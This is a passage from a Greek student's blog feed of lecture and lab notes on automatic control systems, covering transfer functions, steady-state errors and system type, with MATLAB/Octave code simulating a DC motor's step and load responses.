Αυτό είναι κάτι που συνειδητοποίησα την ώρα που λύναμε το παράδειγμα και, παρόλο
που φαντάζομαι πολλοί θα το ήξεραν εκ των προτέρων: <b>η λύση συστημάτων με σύνθετη
αντίσταση δεν είναι τίποτα άλλο παρά ανάλυση με Laplace στο πεδίο της συχνότητας</b>
</p>
</div>
</div>
</div>
<div id="outline-container-orgbd7e33b" class="outline-2">
<h2 id="orgbd7e33b"><span class="section-number-2">4.</span> <a href="#orgbd7e33b">Παράδειγμα αναρτήσεων αυτοκινήτου</a></h2>
<div class="outline-text-2" id="text-4">
<p>
Έστω λοιπόν πως έχουμε το παρακάτω σύστημα αναρτήσεων ενός αυτοκινήτου (ελατήριο
και υγρό για απορρόφηση των ταλαντώσεων του πηνίου)
</p>


<div id="orgf3880ce" class="figure">
<p><img src="posts/lectures/auth/sae1/course_sae1_images/sae1_lec1_paradeigmaanartisi.png" alt="sae1_lec1_paradeigmaanartisi.png">
</p>
</div>

<p>
Έχουμε τις παρακάτω εξισώσεις, οι οποίες περιγράφουν γενικά το σύστημα:
</p>
\begin{align}
\label{eq:4}
F &= ma\\
F &= k\delta x\\
F &= bv
\end{align}

<p>
Όπου \(\delta{x} = x_{out}-x_{in}\), με \(x_{out}\) την μεταβολή του ύψους του <i>κορμού</i> του
αυτοκινήτου, και \(x_{in}\) τις όποιες ανωμαλίες υπάρξουν ως είσοδος στο σύστημα μας:
</p>

<p>
Οπότε προκύπτει η διαφορική:
</p>
\begin{equation}
\label{eq:5}
m x^{(2)} + b(x_0^{(2)} - x_i^{(2)}) + k(x_0-x_i) = 0
\end{equation}

<p>
Εδώ μια ερώτηση είναι γιατί είναι ο πρώτος όρος \(mx^{(2)}\) και όχι
\(m(x_o^{(2)}-x_i^{(2)})\). Αν το ερμηνεύω σωστά είναι \(F=mx_o^{(2)}\) καθώς ο
νόμος του Νεύτωνα εφαρμόστηκε (όπως και η παραπάνω εξίσωση) στο κυρίως σώμα του
αυτοκινήτου, την μετατόπιση του οποίου ορίσαμε και \(x_{out}\)
</p>

\begin{equation}
\label{eq:6}
\mathcal{L}[\cdots] \Rightarrow (ms^2 + bs +k)x_0(s) = (bs + k) x_i(s)
\end{equation}

<p>
Η συνάρτηση μεταφοράς 
</p>

\begin{equation}
\label{eq:7}
H(s) = 
\frac{bs+k}{ms^2+bs+k}
\end{equation}
</div>
<div id="outline-container-org4441bd4" class="outline-3">
<h3 id="org4441bd4"><span class="section-number-3">4.1.</span> <a href="#org4441bd4">Πόλοι και μηδενικά.</a></h3>
<div class="outline-text-3" id="text-4-1">
<p>
Όταν μια συνάρτηση μεταφοράς μπορεί να εκφραστεί στην παρακάτω μορφή, λέμε πως
έχουμε <b>πόλους</b> και <b>μηδενικά</b>:
</p>
\begin{equation}
\label{eq:8}
H(s) = \frac{N(s)}{D(s)} \stackrel{nom, denom}{=} \frac{\prod_i (s-z_i)}{\prod (s-p_i)}
\end{equation}

<p>
Σε αυτή την μορφή είναι εμφανείς οι ρίζες του αριθμητή και του παρονομαστή, με
τα \(p_i\) (ρίζες) που μένουν μετά την απλοποίηση να λέγονται πόλοι του
συστήματος.
</p>

<p>
Αντιστοίχως η μη απλοιποιούμενες ρίζες του αριθμητή λέγονται <b>μηδενικά</b>
</p>
</div>
</div>
</div>
<div id="outline-container-org659905e" class="outline-2">
<h2 id="org659905e"><span class="section-number-2">5.</span> <a href="#org659905e">Συναρτήσεις μεταφοράς σε σειρά</a></h2>
<div class="outline-text-2" id="text-5">
<p>
Σε περίπτωση που έχεις <i>πολλαπλά</i> συστήματα μεταφοράς, υπό συνθήκες:
</p>
\begin{equation}
\label{eq:9}
H(s) = H_{1}(s)H_2(s)
\end{equation}


<div id="orgcd109ef" class="figure">
<p><img src="posts/lectures/auth/sae1/course_sae1_images/sae1_lec1_synartiseis-metaforas-se-seira.png" alt="sae1_lec1_synartiseis-metaforas-se-seira.png">
</p>
</div>
</div>
<div id="outline-container-org962d25c" class="outline-3">
<h3 id="org962d25c"><span class="section-number-3">5.1.</span> <a href="#org962d25c"><b>Η συνθήκη είναι:</b></a></h3>
<div class="outline-text-3" id="text-5-1">
<p>
Η έξοδος του πρώτου συστήματος να μην επηρεάζεται από την παρουσία του δεύτερου
συστήματος εκεί.
</p>

<p>
Παράδειγμα στα κυκλώματα θα μπορούσε να είναι η <i>απειρη</i> αντίσταση εξόδου, ούτως
ώστε να μην επηρεάζεται η έξοδος του πρώτου συστήματος.
</p>

<p>
Σημαντικό, όμως, είναι να υπογραμμίσουμε ότι στην πλειοψηφία των συστημάτων που
θα εξετάσουμε στο πλαίσιο του μαθήματος, ακολουθούμε την θεώρηση πως είναι
ιδανικά, που σημαίνει πως <span class="underline">η παραπάνω ιδιότητα είναι εφαρμόσιμη εκτός αν ρητά
επισημαίνεται το αντίθετο</span>
</p>
</div>
</div>
</div>
<div id="outline-container-org7665def" class="outline-2">
<h2 id="org7665def"><span class="section-number-2">6.</span> <a href="#org7665def">Αρχή της επαλληλίας</a></h2>
<div class="outline-text-2" id="text-6">

<div id="org787cfcd" class="figure">
<p><img src="posts/lectures/auth/sae1/course_sae1_images/sae1_lec1_sistimamethorybo.png" alt="sae1_lec1_sistimamethorybo.png">
</p>
</div>

<p>
Η αρχή της επαλληλίας είναι εφαρμόσιμη στα εξεταζόμενα συστήματα, <b>καθώς αυτά
γραμμικά</b>. Μπορούμε λοιπόν να υπολογίσουμε την συνάρτηση μεταφοράς του \(Y\) ως
προς \(r\) <i>(την είσοδο ελέγχου)</i> και κατόπιν ως προς την \(d\).
</p>



<p>
Καταλήγουμε έτσι στις παρακάτω σχέσεις:
</p>
\begin{equation}
\label{eq:10}
T_r(s) = \frac{Y(s)}{r(s)} = \cdots = \frac{G(s)}{1+GH}
\end{equation}

<p>
<b>Αυτή η σχέση ισχύει για όλα τα συστήματα κλειστού δρόμου με ανάδραση \(h\)</b>
</p>

<p>
Εδώ η άσκηση κανονικά συνεχίζει μα καθώς δεν μπορούσα να καταλήξω σε αποτέλεσμα
που να συμφωνεί με εκείνο των σημειώσεων έχει αφεθεί εκτός.
</p>
</div>
</div>
<div id="outline-container-org393a5e9" class="outline-2">
<h2 id="org393a5e9"><span class="section-number-2">7.</span> <a href="#org393a5e9">Πιο σύνθετο παράδειγμα</a></h2>
<div class="outline-text-2" id="text-7">

<div id="org82e5b0d" class="figure">
<p><img src="posts/lectures/auth/sae1/course_sae1_images/sae1_lec1_syntheto-paradeigma.png" alt="sae1_lec1_syntheto-paradeigma.png">
</p>
</div>


\begin{align*}
\label{eq:12}
y &= H_2(ku + H_1e)\Rightarrow\\
 &= H_2(ku + H_1(u-y))\Rightarrow\\
 &= \frac{H_2(k+H_1)U}{1+H_1+H_2}
\end{align*}

<p>
Οπότε προκύπτει και η συνάρτηση μεταφοράς:
</p>
\begin{equation}
\label{eq:13}
G(s) = \frac{H_2(k+H_1)}{1+H_1+H_2}
\end{equation}
</div>
</div>
<div id="outline-container-org25e927f" class="outline-2">
<h2 id="org25e927f"><span class="section-number-2">8.</span> <a href="#org25e927f">Σφάλμα εισόδου</a></h2>
<div class="outline-text-2" id="text-8">
<p>
Ορίζουμε νέο μέγεθος, το <i>λάθος</i>, το οποίο συμβολίζουμε με \(e\) και δίνεται από την σχέση:
</p>
\begin{equation}
\label{eq:15}
e(s) = r(s) - y(s)
\end{equation}

<p>
Αν και το ορίσαμε με αυτή την <i>γενική</i> σχέση στην πραγματικότητα μας ενδιαφέρουν,
και προσπαθούμε να τους εξασφαλίσουμε μηδενικές τιμές:
</p>
<ol class="org-ol">
<li>Σφάλμα θέσης, όταν η συνάρτηση εισόδου είναι η βηματική</li>
<li>Σφάλμα ταχύτητας, όταν η συνάρτηση εισόδου είναι ράμπα</li>
<li>Σφάλμα επιτάχυνσης, όταν η συνάρτηση εισόδου είναι παραβολική</li>
</ol>



<p>
Γιατί σταματάμε στην επιτάχυνση και δεν συνεχίζουμε? Γιατί το να πετύχεις στην
πράξη σφάλμα μηδεν σε μεγαλύτερη τάξη είναι εξαιρετικά δύσκολο και επηρεάζει την
ευστάθεια του συστήματος.
</p>

\begin{align}
\label{eq:69}
e_{ssp} &= \frac{1}{s} - y(s)&\text{position}\\
e_{ssv} &= \frac{1}{s^2} - y(s) &\text{velocity}\\
e_{ssa} &= \frac{1}{s^3} - y(s)&\text{acceleration}
\end{align}
</div>
<div id="outline-container-org9478cc6" class="outline-3">
<h3 id="org9478cc6"><span class="section-number-3">8.1.</span> <a href="#org9478cc6">Δίνοντας συγκεκριμένους τύπους</a></h3>
<div class="outline-text-3" id="text-8-1">
<p>
Οι παρακάτω τύποι, όπου εμφανίζονται όρια, προφανώς συνδέονται με το θεώρημα
τελικής τιμής από τις βασικές έννοιες.
</p>
</div>
<ol class="org-ol">
<li><a id="org2e91bb5"></a><a href="#org2e91bb5">Μοναδιαία Αρνητική Ανάδραση</a><br>
<div class="outline-text-5" id="text-8-1-0-1">
<p>
Έχουμε το κλασσικό σύστημα μοναδιαίας αρνητικής ανάδρασης:
<img src="posts/lectures/auth/sae1/course_sae1_images/sae1_lec1_monadiaia-arn-anadrasi.png" alt="sae1_lec1_monadiaia-arn-anadrasi.png">
</p>

<p>
Είναι γνωστό πως η συνάρτηση μεταφοράς δίνεται από την:
</p>

\begin{equation}
\label{eq:68}
\frac{Y}{R} = \frac{H_1}{1+H_1}
\end{equation}

<p>
Επομένως η αρχική εξίσωση μας γίνεται:
</p>
\begin{equation}
\label{eq:31}
e(s) = r(s) - y(s) = r(s) - \frac{H_1}{1+H_1}r(s) = r(s)(1-\cdots) = r(s) \frac{1}{1+H_1}
\end{equation}

<p>
Απο αυτό αντικαθιστώντας στις εξισώσεις για τα επιμέρους σφάλματα:
</p>

\begin{align}
\label{eq:79}
e_{ssp} &\stackrel{r = 1}{ = } \frac{1}{s} \frac{1}{1+H_1} \stackrel{FinalValueTheorem}{=} \frac{1}{1+\lim_{s\to0}H(s)} &\text{position}\\
e_{ssv} &\stackrel{r = linear}{ = }  \frac{1}{s^2} \frac{1}{1+H_1} \stackrel{FinalValueTheorem}{ = } \frac{1}{\lim_{s\to0}sH(s)} &&\text{velocity}\\
e_{ssa} &\stackrel{r = parab}{ = }  \frac{1}{s^3} \frac{1}{1+H_1} \stackrel{FinalValueTheorem}{ = } \frac{1}{\lim_{s\to0}s^2H(s)} &&\text{acceleration}
\end{align}
</div>
<ol class="org-ol">
<li><a id="org2d0f158"></a><a href="#org2d0f158">Σταθερές ορίων</a><br>
<div class="outline-text-6" id="text-8-1-0-1-1">
<p>
Ουσιαστικα οι σταθεροί όροι που εμφανίζονται με μορφή ορίων στα αντίστοιχα όρια
ονομάζονται σταθερα σφαλματος θεσης, ταχύτητας, επιταχυνσης
</p>
\begin{align}
\label{eq:27}
K_p &= \lim_{s\to0} H(s)\\
K_v &= \lim_{s\to0} sH(s)\\
K_a &= \lim_{s\to0} s^2H(s)
\end{align}

<p>
Και έχουμε 
</p>
</div>
</li>
</ol>
</li>
<li><a id="orgeeee01b"></a><a href="#orgeeee01b">Γενική Περίπτωση (Closed Loop)</a><br>
<div class="outline-text-5" id="text-8-1-0-2">
<p>
Προφανώς, όμως, η παραπάνω ανάλυση, καθώς βασίζεται στην συνάρτηση μεταφοράς
συστήματος με μοναδιαία αρνητική ανάδραση δεν είναι εφαρμόσιμη σε όλες τις
περιπτώσεις. Σε εκείνες έχουμε: (έστω \(H_2\) το σύστημα στην ανάδραση)
</p>

<p>
Χρησιμοποιώντας την συνάρτηση μεταφοράς στο πιο <i>σύνθετο</i> πλέον σύστημα:
</p>
\begin{equation}
\label{eq:32}
Y(s) \stackrel{cl = closed loop}{=} H_{cl }r(s) = \frac{H_1}{1+H_1H_2}r(s)
\end{equation}

<p>
Έτσι έχουμε 
</p>
\begin{equation}
\label{eq:33}
e(s) = r(s)(1 - \frac{H_1}{1+H_1H_2}) = r(s)(1 - H_{cl})
\end{equation}

<p>
Και κατ&rsquo;επέκταση, τις εξισώσεις για τα επιμέρους σφάλματα:
</p>
\begin{align}
\label{eq:34}
e_{ssp} &= \frac{1}{s}(1-H_{cl}) \stackrel{FVT}{ = } \lim_{s\to0} (1-H_{cl})\\
e_{ssp} &= \frac{1}{s^2}(1-H_{cl}) \stackrel{FVT}{ = } \lim_{s\to0} s(1-H_{cl})\\
e_{ssp} &= \frac{1}{s^3}(1-H_{cl}) \stackrel{FVT}{ = } \lim_{s\to0} s^2(1-H_{cl})
\end{align}
</div>
</li>
</ol>
</div>
<div id="outline-container-orgda16c3c" class="outline-3">
<h3 id="orgda16c3c"><span class="section-number-3">8.2.</span> <a href="#orgda16c3c">Τύπος συστήματος</a></h3>
<div class="outline-text-3" id="text-8-2">
<p>
Παραπάνω αναφέραμε <a href="#org4441bd4">τους πόλους και τα μηδενικά</a> μίας συνάρτησης. Ανάλογα με την
φύση των πόλων ορίζουμε και τον τύπο του συστήματος μας. Αναλυτικότερα, το
πλήθος των πόλων στο σημείο μηδεν ισούται με τον τύπο του συστήματος όπως
φαίνεται στον παρακάτω πίνακα:
</p>
<table>


<colgroup>
<col  class="org-left">

<col  class="org-left">
</colgroup>
<thead>
<tr>
<th scope="col" class="org-left">Αριθμός πόλων στο 0</th>
<th scope="col" class="org-left">Τύπος αντίστοιχου συστήματος</th>
</tr>
</thead>
<tbody>
<tr>
<td class="org-left">0</td>
<td class="org-left">Τύπου 0</td>
</tr>

<tr>
<td class="org-left">1</td>
<td class="org-left">Τύπου 1</td>
</tr>

<tr>
<td class="org-left">&#x2026;</td>
<td class="org-left">&#x2026;</td>
</tr>

<tr>
<td class="org-left">Ν</td>
<td class="org-left">Τύπου Ν</td>
</tr>
</tbody>
</table>
</div>
<div id="outline-container-org71d5fe7" class="outline-4">
<h4 id="org71d5fe7"><span class="section-number-4">8.2.1.</span> <a href="#org71d5fe7">Τι σημαίνει ο τύπος συστήματος για τις τιμές των σφαλμάτων;</a></h4>
<div class="outline-text-4" id="text-8-2-1">
<p>
Ο τύπος συστήματος μας δείχνει ποιο <i>επίπεδο</i> σφάλματος θα είναι το τελευταίο που
θα έχει τιμή πραγματικού αριθμού (βασικά θα είναι το μόνο που μπορεί να έχει μη
μηδενική τιμή πραγματικού αριθμού). Ενδεικτικά, ισχύει το παρακάτω πινακάκι όπου
μας δείχνει τα σφάλματα ανά τύπο σε σύστημα με μοναδιαία αρνητική ανάδραση:
</p>

<table>


<colgroup>
<col  class="org-left">

<col  class="org-left">

<col  class="org-left">

<col  class="org-left">
</colgroup>
<thead>
<tr>
<th scope="col" class="org-left">τύπος</th>
<th scope="col" class="org-left">σφάλμα θέσης</th>
<th scope="col" class="org-left">σφάλμα ταχύτητας</th>
<th scope="col" class="org-left">σφάλμα επιτάχυνσης</th>
</tr>
</thead>
<tbody>
<tr>
<td class="org-left">τύπου 0  N = 0</td>
<td class="org-left">\(\frac{1}{1+G}\)</td>
<td class="org-left">\(\infty\)</td>
<td class="org-left">\(\infty\)</td>
</tr>

<tr>
<td class="org-left">τύπου 1  N = 1</td>
<td class="org-left">\(0\)</td>
<td class="org-left">\(\frac{1}{G}\)</td>
<td class="org-left">\(\infty\)</td>
</tr>

<tr>
<td class="org-left">τύπου 2  N = 2</td>
<td class="org-left">\(0\)</td>
<td class="org-left">\(0\)</td>
<td class="org-left">\(\frac{1}{G}\)</td>
</tr>
</tbody>
</table>

<p>
Παρατηρούμε λοιπόν πως η αύξηση του \(G\) συνεπάγεται μείωση των σφαλμάτων.
</p>
</div>
</div>
</div>
</div>
<div id="outline-container-orgccfe512" class="outline-2">
<h2 id="orgccfe512"><span class="section-number-2">9.</span> <a href="#orgccfe512">Τελευταία άσκηση:</a></h2>
<div class="outline-text-2" id="text-9">
<p>
Έχουμε το παρακάτω σύστημα
<img src="posts/lectures/auth/sae1/course_sae1_images/sae1_lec1_teleytaiaaskisi.png" alt="sae1_lec1_teleytaiaaskisi.png">
</p>

<p>
όπου, όπως φαίνεται και στην εικόνα είναι:
</p>
\begin{align*}
H_1 &= K\\
H_{2} &= \frac{1}{s(\jmath s + b)}
\end{align*}

<p>
Ζητείται \(e_{ssp}= 0\)
</p>

<p>
Αρχικά υπολογίζουμε τις επιμέρους συναρτήσεις αναφοράς
</p>
\begin{align}
\label{eq:29}
\frac{Y(s)}{R(s)} &= \frac{k}{s^2j+bs+k}\\
\frac{Y(s)}{D(s)} &= \frac{1}{s^2j+bs+k}
\end{align}


<p>
Για τα <b>σφάλματα.</b>
</p>

<p>
Είτε πάει κανείς από ορισμό και FVT είτε πάει με τις σταθερές καταλήγουμε στο
ίδιο αποτέλεσμα:
</p>
<ul class="org-ul">
<li><p>
Ως προς \(y\):
</p>
\begin{align}
 \label{eq:35}
 e_{ssp} &= 0\\
 e_{ssv} &= \frac{b}{k}\\
 e_{ssa} &= \infty
 \end{align}</li>

<li>Ενώ ως προς την \(D\):</li>
</ul>
\begin{align}
\label{eq:36}
e_{ssp} &= \infty\\
& \Rightarrow e_{ssv} = e_{ssa} = \infty
\end{align}
</div>
</div>
<div id="outline-container-org53b0688" class="outline-2">
<h2 id="org53b0688"><span class="section-number-2">10.</span> <a href="#org53b0688">Βελτιώνοντας το σύστημα</a></h2>
<div class="outline-text-2" id="text-10">
<p>
Επομένως για να μηδενίσουμε το σφάλμα θέσης θα πρέπει να αλλάξουμε τον ελεγκτή μας.
</p>

<p>
Μπορούμε να τον αντικαταστήσουμε με έναν της μορφής:
</p>

\begin{equation}
\label{eq:30}
u = (K_p+ \frac{K_i}{s})e(s)
\end{equation}

<p>
Με αυτόν τον τρόπο παρατηρούμε πως η συνάρτηση μεταφοράς (ως προς την είσοδο
αναφοράς) είναι τύπου 2 επομένως ξέρουμε ήδη πως για την \(y\) το σύστημα έχει ήδη
βελτιωθεί:
</p>
\begin{align}
\label{eq:37}
e_{ssp} &= 0\\
e_{ssv} &= 0\\
e_{ssa} &= \frac{b}{K_i}
\end{align}

<p>
Αντίστοιχα (προστίθοντας τον ολοκληρωτή πριν την είσοδο της διαταραχής):
</p>
\begin{equation}
\label{eq:38}
e_{ssp} = \cdots = 1
\end{equation}
<p>
Το οποίο μας δείχνει δηλαδή ότι η διαταραχή <i>απορροφάται</i> από το σύστημα και δεν
εμφανίζεται στην έξοδο.
</p>


<div id="orge1a242a" class="figure">
<p><img src="posts/lectures/auth/sae1/course_sae1_images/sae1_lec1_teleytaiaaskisi-mideniko-ssp.png" alt="sae1_lec1_teleytaiaaskisi-mideniko-ssp.png">    
</p>
</div>
</div>
</div>
]]>
</description></item>
<item>
<title>1ο Εργαστήριο</title>
<link>posts/lectures/auth/sae1/lec_SAE1_lab1-matlab.html</link>
<pubDate>Thu, 24 Nov 2022 00:00:00 +0200</pubDate>
<guid>posts/lectures/auth/sae1/lec_SAE1_lab1-matlab.html</guid>
<description>
<![CDATA[<p>
Μερικά γενικά tips από το εργαστήριο:
</p>
<ul class="org-ul">
<li>Βάζοντας semicolon (;) στο τέλος ενός statement το output του δεν φαίνεται στο
cli του Matlab</li>
<li>Αυτό το εργαστήριο είνα μελέτη (αποκλειστικά) open loop. Στο επόμενο θα
<i>κλείσουμε</i> τον βρόχο και θα μοντελοποιήσουμε/προσθέσουμε ελεγκτές και
συγκριτές, θέτοντας παράλληλα και προδιαγραφές</li>
</ul>

<div class="note" id="orgb109434">
<p>
Σε όλες τις σημειώσεις έχω χρησιμοποιήσει source blocks του octave γιατί εκείνο
τρέχω/έχω εγκατεστημένο στο workstation μου. Προφανώς το εργαστήριο
πραγματοποιήθηκε σε Matlab.
</p>

<p>
Ακόμα στην πραγματικότητα ο κώδικας εδώ δεν θα δούλευε σε octave λόγω
προβλήματος με τα εμπλεκόμενα packages.
</p>

</div>
<div id="outline-container-org521dff1" class="outline-2">
<h2 id="org521dff1"><span class="section-number-2">1.</span> <a href="#org521dff1">Το σύστημα</a></h2>
<div class="outline-text-2" id="text-1">
<p>
Η μοντελοποίηση του συστήματος είναι της μορφής:
<img src="posts/lectures/auth/sae1/course_sae1_images/221207_0858_sae1_lab1_system.png" alt="221207_0858_sae1_lab1_system.png">
</p>

<p>
όπου αφαιρετικά η μία είσοδος είναι η τάση και αποτελεί την <b>είσοδο ελέγχου</b> ενώ η
δεύτερη είσοδος, απόρροια της φύσης του κινητήρα, είναι στην πραγματικότητα η ροπή.
</p>

<p>
Οι τύποι των δύο συναρτήσεων μεταφοράς \(H_v,H_t\) είναι
</p>
\begin{align}
\label{eq:1}
H_v&= 
\frac{K_m}{(R_a+sL_a)(sJ+B)+KK_m}=
\frac{8000}{s^2+440.1s+5164}\\
H_t&= 
\frac{-(R_a+sL_a)}{(R_a+sL_a)(sJ+B)+KK_m} =
\frac{-1250(s+440)}{s^2+440.1s+5164}
\end{align}

<p>
Στην ανάλυση που θα πραγματοποιήσουμε θέλουμε να αναπαραστήσουμε γραφικά
την έξοδο του συστήματος με διάφορες τιμές εισόδων, δίνοντας μας μια καλύτερη
εικόνα για την συμπεριφορά του.
</p>
</div>
</div>
<div id="outline-container-orga7bcab8" class="outline-2">
<h2 id="orga7bcab8"><span class="section-number-2">2.</span> <a href="#orga7bcab8">Θέσιμο παραμέτρων</a></h2>
<div class="outline-text-2" id="text-2">
<p>
Οταν φτιάχνεις array με συντελεστές πολυωνύμου προσέχεις να εισάγεις <b>όλους</b> τους
όρους, ακόμα και εκείνους που <i>φαινομενικά</i> παραλείπονται.
</p>

<p>
Αρχικά φτιάχνουμε την συνάρτηση μεταφοράς της \(V\). Το <code>o</code> είναι εκεί για original,
αποκτά σημασία πιο κάτω.
</p>
<div class="org-src-container">
<pre class="src src-octave">nVo <span class="org-builtin">=</span> 8000<span class="org-builtin">;</span>
dVo <span class="org-builtin">=</span> [ 1 440.1 5164]<span class="org-builtin">;</span>

<span class="org-comment-delimiter">% </span><span class="org-comment">tf &gt; construct transfer func</span>
HVo <span class="org-builtin">=</span> tf(nVo<span class="org-builtin">,</span>dVo)<span class="org-builtin">;</span>
</pre>
</div>

<p>
Με τον ίδιο τρόπο την συνάρτηση μεταφοράς της \(T\)
</p>
<div class="org-src-container">
<pre class="src src-octave">
nTo <span class="org-builtin">=</span> [1250 440<span class="org-builtin">*</span>(<span class="org-builtin">-</span>1250)]<span class="org-builtin">;</span>
dTo <span class="org-builtin">=</span> dVo<span class="org-builtin">;</span>
HTo <span class="org-builtin">=</span> tf(nTo<span class="org-builtin">,</span>dTo)<span class="org-builtin">;</span>

</pre>
</div>
</div>
</div>
<div id="outline-container-org00bda1e" class="outline-2">
<h2 id="org00bda1e"><span class="section-number-2">3.</span> <a href="#org00bda1e">Ευστάθεια συστήματος</a></h2>
<div class="outline-text-2" id="text-3">
<p>
Με την παρακάτω συνάρτηση μπορούμε να πάρουμε τις ρίζες ενός πολυωνύμου
</p>
<div class="org-src-container">
<pre class="src src-octave"><span class="org-comment-delimiter">% </span><span class="org-comment">roots -&gt; rizes polyonymou</span>
p <span class="org-builtin">=</span> roots(dVo)<span class="org-builtin">;</span>
</pre>
</div>

<p>
το οποίο στην προκειμένη μας δείχνει οτι το σύστημα ευσταθές, με δύο αρνητικούς
και πραγματικούς πόλους<sup><a id="fnr.1" class="footref" href="#fn.1" role="doc-backlink">1</a></sup>. Ο ένας (κοντά στο 0) λέγεται <b>αργός</b> πόλος και
καθορίζει την συμπεριφορά της συνάρτησης μεταφοράς μακροπρόθεσμα, ενώ ο δεύτερος
είναι <i>υπεύθυνος</i> για την γρήγορη/μεταβατική απόκριση
</p>
</div>
</div>
<div id="outline-container-org8968bcd" class="outline-2">
<h2 id="org8968bcd"><span class="section-number-2">4.</span> <a href="#org8968bcd">DC Gain</a></h2>
<div class="outline-text-2" id="text-4">
<p>
Για την ενίσχυση στο Steady State (δηλαδή το dc-gain) ισχύει:
</p>

\begin{equation}
\label{eq:2}
\text{DCGain} = H(0)
\end{equation}

<div class="org-src-container">
<pre class="src src-octave">
dcHVo <span class="org-builtin">=</span> dcgain(HVo)<span class="org-builtin">;</span>
<span class="org-comment-delimiter">% </span><span class="org-comment">to arnitiko htan leei anamenomeno logo ths fysews tou TL kinitira</span>
dcTVo <span class="org-builtin">=</span> dcgain(HTo)<span class="org-builtin">;</span>

</pre>
</div>
</div>
</div>
<div id="outline-container-orga4dd05f" class="outline-2">
<h2 id="orga4dd05f"><span class="section-number-2">5.</span> <a href="#orga4dd05f">Plotting με step function</a></h2>
<div class="outline-text-2" id="text-5">
<p>
Μπορούμε να δούμε την απόκριση του συστήματος μας αν για είσοδο είχε ένα step
function μέσω των παρακάτω εντολών:
</p>

<div class="org-src-container">
<pre class="src src-octave">
step(HVo)
step(HTo)

</pre>
</div>
</div>
<div id="outline-container-orgccc726c" class="outline-3">
<h3 id="orgccc726c"><span class="section-number-3">5.1.</span> <a href="#orgccc726c">Θεωρητικά σχόλια</a></h3>
<div class="outline-text-3" id="text-5-1">
<ul class="org-ul">
<li>Παρατηρούμε πως το unit step (κατά την διάρκεια του) μας επιτρέπει να φτάσουμε
την ss κατάσταση του συστήματος</li>
<li>Από το γράφημα που προκύπτει:
<ul class="org-ul">
<li>Μπορείς να βάλεις να δεις τα <code>rise time</code>, <code>settle time</code></li>
</ul></li>
</ul>
</div>
</div>
</div>
<div id="outline-container-org6ffc1e7" class="outline-2">
<h2 id="org6ffc1e7"><span class="section-number-2">6.</span> <a href="#org6ffc1e7">Προσέγγιση</a></h2>
<div class="outline-text-2" id="text-6">
<p>
Μπορούμε να προσεγγίσουμε την συμπεριφορά του συστήματος αφαιρώντας τον πόλο μα
<i>κρατώντας</i> την θέση του (αυτό οφείλεται στο οτι το μεταβατικό φεύγει γρήγορα)
</p>

<div class="org-src-container">
<pre class="src src-octave">
HV <span class="org-builtin">=</span> tf(18.69<span class="org-builtin">,</span> [1 12.064])<span class="org-builtin">;</span>
HT <span class="org-builtin">=</span> tf([<span class="org-builtin">-</span>2.92 <span class="org-builtin">-</span>2.92<span class="org-builtin">*</span>440]<span class="org-builtin">,</span> [1 12.064])<span class="org-builtin">;</span>

</pre>
</div>

<p>
Και μπορούμε να δούμε πάλι την προσέγγιση
</p>
<div class="org-src-container">
<pre class="src src-octave">
step(HV)

</pre>
</div>
</div>
</div>
<div id="outline-container-org3300cf3" class="outline-2">
<h2 id="org3300cf3"><span class="section-number-2">7.</span> <a href="#org3300cf3">LSIN</a></h2>
<div class="outline-text-2" id="text-7">
<div class="org-src-container">
<pre class="src src-octave">t <span class="org-builtin">=</span> 0 <span class="org-builtin">:</span> 0.001 <span class="org-builtin">:</span> 0.7<span class="org-builtin">;</span>
uV <span class="org-builtin">=</span> 150<span class="org-builtin">*</span>stepfun(t<span class="org-builtin">,</span>0)<span class="org-builtin">;</span>

yV1 <span class="org-builtin">=</span> lsim(HVo<span class="org-builtin">,</span>uV<span class="org-builtin">,</span>t)<span class="org-builtin">;</span>
yV2 <span class="org-builtin">=</span> lsim(HV<span class="org-builtin">,</span>uV<span class="org-builtin">,</span>t)<span class="org-builtin">;</span>

<span class="org-comment-delimiter">%</span><span class="org-comment">step(HVo)</span>
plot(t<span class="org-builtin">,</span>yV1<span class="org-builtin">,</span>t<span class="org-builtin">,</span>yV2)<span class="org-builtin">;</span>
</pre>
</div>
</div>
</div>
<div id="outline-container-org7eea365" class="outline-2">
<h2 id="org7eea365"><span class="section-number-2">8.</span> <a href="#org7eea365">Επίδραση φορτίου στην απόκριση στροφών</a></h2>
<div class="outline-text-2" id="text-8">
<div class="org-src-container">
<pre class="src src-octave">uV<span class="org-builtin">=</span>150<span class="org-builtin">*</span>stepfun(t<span class="org-builtin">,</span>0)<span class="org-builtin">;</span>
uT1<span class="org-builtin">=</span>0.5<span class="org-builtin">*</span>stepfun(t<span class="org-builtin">,</span>0)<span class="org-builtin">;</span>
uT2<span class="org-builtin">=</span>1.0<span class="org-builtin">*</span>stepfun(t<span class="org-builtin">,</span>0)<span class="org-builtin">;</span>
uT3<span class="org-builtin">=</span>1.5<span class="org-builtin">*</span>stepfun(t<span class="org-builtin">,</span>0)<span class="org-builtin">;</span>
yV<span class="org-builtin">=</span>lsim(HV<span class="org-builtin">,</span> uV<span class="org-builtin">,</span> t)<span class="org-builtin">;</span>
yT1<span class="org-builtin">=</span>lsim(HT<span class="org-builtin">,</span> uT1<span class="org-builtin">,</span> t)<span class="org-builtin">;</span>
yT2<span class="org-builtin">=</span>lsim(HT<span class="org-builtin">,</span> uT2<span class="org-builtin">,</span> t)<span class="org-builtin">;</span>
yT3<span class="org-builtin">=</span>lsim(HT<span class="org-builtin">,</span> uT3<span class="org-builtin">,</span> t)<span class="org-builtin">;</span>
y1<span class="org-builtin">=</span>yV<span class="org-builtin">+</span>yT1<span class="org-builtin">;</span>
y2<span class="org-builtin">=</span>yV<span class="org-builtin">+</span>yT2<span class="org-builtin">;</span>
y3<span class="org-builtin">=</span>yV<span class="org-builtin">+</span>yT3<span class="org-builtin">;</span>
plot(t<span class="org-builtin">,</span> y1<span class="org-builtin">,</span> t<span class="org-builtin">,</span>y2<span class="org-builtin">,</span> t<span class="org-builtin">,</span> y3)
</pre>
</div>
</div>
</div>
<div id="footnotes">
<h2 class="footnotes">Footnotes: </h2>
<div id="text-footnotes">

<div class="footdef"><sup><a id="fn.1" class="footnum" href="#fnr.1" role="doc-backlink">1</a></sup> <div class="footpara" role="doc-footnote"><p class="footpara">
Δηλώθηκε οτι αυτό ήταν αναμενόμενο καθώς εξετάζαμε RL, παθητικό κύκλωμα,
μα σε αυτή την φάση δεν μπορώ να το εξηγήσω περισσότερο. 
</p></div></div>


</div>
</div>]]>
</description></item>
<item>
<title>2ο Εργαστήριο</title>
<link>posts/lectures/auth/sae1/lec_SAE1_lab2-matlab.html</link>
<pubDate>Thu, 24 Nov 2022 00:00:00 +0200</pubDate>
